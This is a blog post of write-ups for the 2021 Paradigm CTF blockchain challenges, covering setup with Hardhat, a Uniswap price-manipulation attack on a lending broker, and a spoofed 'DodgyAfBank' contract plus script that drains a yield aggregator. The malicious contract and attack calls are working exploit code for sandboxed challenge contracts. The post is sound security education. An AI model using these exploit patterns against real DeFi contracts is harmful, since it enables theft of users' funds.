---
title: 🧠 Paradigm CTF Writeups 
author: Ashiq Amien
date: 2021-02-12 22:45:00 +0200
categories: [CTF, Blockchain]
tags: ctf
math: true
---

## hello

This was a sanity check to ensure that your setup is working. For each challenge, we're given our own private blockchain instance where the setup contracts were deployed and for us to solve. The following is an example of the info given used to connect to our blockchain:


```
here's some useful information
uuid:           9863518d-0e8c-472e-8324-a53c4790206c
rpc endpoint:   http://<IP>:8545/9863518d-0e8c-472e-8324-a53c4790206c
private key:    0x9f512358edfc2c1490c07e9db67eb39df92a566327718084ced42a33e555e4ad
setup contract: 0x8aeCd9f0079A45CbF385c9E5Aa3DC5b7cBe2ED8C
```

To use the above, you could either setup a custom network with the RPC endpoint in metamask, and use remix with the "Injected Web3" environment. We're also given a private key with lots of ETH on it, which can be imported into metamask. While this was the easiest setup, it was also nice to use Hardhat for extra debugging. The following code snippet is an example test that can be run to interact with the contracts. For this to work, you'd need to configure a custom network in hardhat.config.js to use the RPC endpoint:

```javascript
module.exports = {
	networks: {
	  paradigmchain: {
	  	url: "http://<IP>:8545/e1d28267-3ee7-4398-9d5f-b978dbdeddaf"
	  }
	},
	solidity: "0.8.0",
}; 
```

Then import the challenge contract files ([setup.sol](../../assets/code/paradigmctf-2021/Hello-Setup.sol.txt) and [hello.sol](../../assets/code/paradigmctf-2021/Hello.sol.txt)) and run the following test to solve the challenge:


```javascript
const { expect } = require("chai")
const { waffle } = require("hardhat")
let provider = ethers.getDefaultProvider();

describe("hello", function () {

  let setup;
  let hello;
  
  beforeEach(async () => {

    //use artifact Setup at address 0x9b...3e.
    setup = await ethers.getContractAt("Setup" , "0x9bC93A325278A393A950613C45ac54e9200CdF3e");
    
    //Use the code below to deploy the contracts on your own mainnet fork
    //const Setup = await ethers.getContractFactory("Setup");    
    //setup = await Setup.deploy();
    //await setup.deployed();
  });

  it("this setup should work", async function () {
    console.log("solved y/n: " + await setup.isSolved()); 
    hello = await ethers.getContractAt("Hello", await setup.hello());
    await hello.solve();
    console.log("solved y/n: " + await setup.isSolved()); 
  });

})
```

## broker

We're given the following setup contract:

```javascript
contract Setup {
    WETH9 public constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Factory public constant factory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);
    Token public token;
    IUniswapV2Pair public pair;
    Broker public broker;

    uint256 constant DECIMALS = 1 ether;
    uint256 totalBefore;

    // create and bootstrap the token/weth pool for borrowing against WETH
    constructor() payable {
        require(msg.value == 50 ether);
        weth.deposit{value: msg.value}();

        token = new Token();
        pair = IUniswapV2Pair(factory.createPair(address(weth), address(token)));
        broker = new Broker(pair, ERC20Like(address(token)));
        token.transfer(address(broker), 500_000 * DECIMALS);

        // 1:25
        weth.transfer(address(pair), 25 ether);
        token.transfer(address(pair), 500_000 * DECIMALS);
        pair.mint(address(this));

        weth.approve(address(broker), type(uint256).max);
        broker.deposit(25 ether);
        broker.borrow(250_000 * DECIMALS);

        totalBefore = weth.balanceOf(address(broker)) + token.balanceOf(address(broker)) / broker.rate();
    }

    function isSolved() public view returns (bool) {
        return weth.balanceOf(address(broker)) < 5 ether;
    }
}
```

To solve the challenge, we need to siphon at least 20 WETH from the [broker contract](../../assets/code/paradigmctf-2021/Broker.sol.txt). There are only 2 functions in the broker contract that accomodate transferring out WETH, which is the `liquidate()` function and `withdraw()` function. Since we can't spoof the setup contract in a call to `withdraw()`, we need to try and liquidate the setup contract. This means we need to increase the setup contract's `safedebt`, which means we need to increase the `rate()`, which is the ratio of tokens to WETH in the reserve pool. This means the rate will drop if we increase the `reserve1` quantity or decrease the `reserve0` quantity. In simpler terms, we need to buy some tokens. Using the `IUniswapV2Router01.sol` contract, we can interact with uniswap to buy some tokens with the following function call:

```javascript
//(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) 
swapTokensForExactETH(100000000000000000000000, 1000000000000000000000 ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2","0x62Ee12a5b47fEe18c3eCC40a4F622c1e494cA365"], "0xb3d03dfF3791c5eA7435b8C933A82b3aB0E63557", 1625235900)
```

After some trial and error, I saw that buying around 180k tokens gave us a rate of 8181. This means we can liquidate `collateralValueRepaid` = $$ 1800 / 8181 = 22 $$ ETH  from the setup contract, which completes the challenge. 

## secure

The following setup contract was given:

```javascript
contract Setup {
    WETH9 public constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    uint public constant WANT = 50 ether;

    Wallet public wallet;

    constructor() public payable {
        require(msg.value == WANT);

        address tokenModule = address(new TokenModule());

        wallet = new Wallet();
        wallet.allowModule(tokenModule);

        WETH.deposit.value(msg.value)();
        WETH.approve(address(wallet), uint(-1));

        wallet.execModule(tokenModule, abi.encodeWithSelector(TokenModule(0x00).deposit.selector, WETH, address(this), msg.value));
    }

    function isSolved() public view returns (bool) {
        return WETH.balanceOf(address(this)) == WANT;
    }
}
```

The aim of the challenge was to increase the WETH balance of the setup contract by 50 weth. After looking at the [wallet contract code](../../assets/code/paradigmctf-2021/Wallet.sol.txt) for a few hours, it seemed like there was no exploit. Sending the required WETH solves the challenge. (other solutions seem to follow the same path)

## yield-aggregator

We're given the following setup contract:

```javascript
contract Setup {
    YieldAggregator public aggregator;
    MiniBank public bank;
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    constructor() payable {
        require(msg.value == 100 ether);
        bank = new MiniBank();

        aggregator = new YieldAggregator();

        weth.deposit{value: msg.value}();
        weth.approve(address(aggregator), type(uint256).max);

        address[] memory _tokens = new address[](1);
        _tokens[0] = address(weth);

        uint256[] memory _amounts = new uint256[](1);
        _amounts[0] = 50 ether;

        // we deposit 50 weth to the system
        aggregator.deposit(Protocol(address(bank)), _tokens, _amounts);
    }

    function isSolved() public view returns (bool) {
        return weth.balanceOf(address(aggregator)) == 0 &&
            weth.balanceOf(address(bank)) == 0;
    }
}
```

The goal is to drain both the [aggregator](../../assets/code/paradigmctf-2021/YieldAggregator.sol.txt) and the [bank](../../assets/code/paradigmctf-2021/Setup-YieldAggregator.sol.txt) WETH balance. Notice that the only way we can drain the minibank is to call burn, but the balance belongs to the yield aggregator, so the only way to get there is to call withdraw from the aggregator. We can't call withdraw directly since solidity 0.8.0 integrates overflow protection in its arithmetic operators now. 

Notice that if we had some pool tokens, we could drain the ETH balance of both the aggregator and bank since we send the WETH directly to `msg.sender` instead of the MiniBank/owner itself. Since the yield-aggregator contract is not tied to any protocol, we could just create our own Minibank to spoof the underlying balance and get some free tokens. I initially thought we should try to force a revert when calling `protocol.mint(amount)` so that we land up into the catch statement, but I realized that the only thing necessary is to update the underlying balance. The following contract was the malicious Minibank used to spoof the underlying balance:

```javascript
contract DodgyAfBank is Protocol {

    ERC20Like public override underlying = ERC20Like(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    mapping (address => uint256) public balanceOf;
    uint256 public totalSupply;
    uint256 public fakeUnderlyingBal;

    function mint(uint256 amount) public override {
        
        require(underlying.transferFrom(msg.sender, address(this), amount));
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
        fakeUnderlyingBal += 50 ether;
        //require(1 == 2, "sorry, there's load shedding");
    }

    function balanceUnderlying() public override view returns (uint256) {
        return fakeUnderlyingBal;
    }
    
    function burn(uint256 amount) public override {
        balanceOf[msg.sender] -= amount;
        totalSupply -= amount;
        require(underlying.transfer(msg.sender, amount));
    }

    function rate() public override view returns (uint256) {
        return 1;
    }
}
```

Calling deposit with no WETH gives us some pool tokens, which we can use to withdraw the balance of the bank and aggregator:


```javascript
//deploy a dodgy bank
const DodgyAfBank = await ethers.getContractFactory("DodgyAfBank");
let dab = await DodgyAfBank.deploy();
await dab.deployed();

//deposit 0 WETH and get some pool tokens
await yield_aggregator.deposit(dab.address, ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"], [ethers.utils.parseEther("0")]);

console.log("I have this many pool tokens now: " + await yield_aggregator.getPoolTokens());

//use the pool tokens to withdraw the MiniBank's WETH
await yield_aggregator.withdraw(bankaddr, ["0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"], [ethers.utils.parseEther("50")]);
```   
This drains the aggregator and the Minibank, which solves the challenge. 


---
Really big thanks to [@paradigmctf](https://twitter.com/paradigm_ctf?lang=en) for the great CTF! There were lots of cool challenges, and there's definitely lots more to learn from the unsolved chals. Looking forward to the next one! :)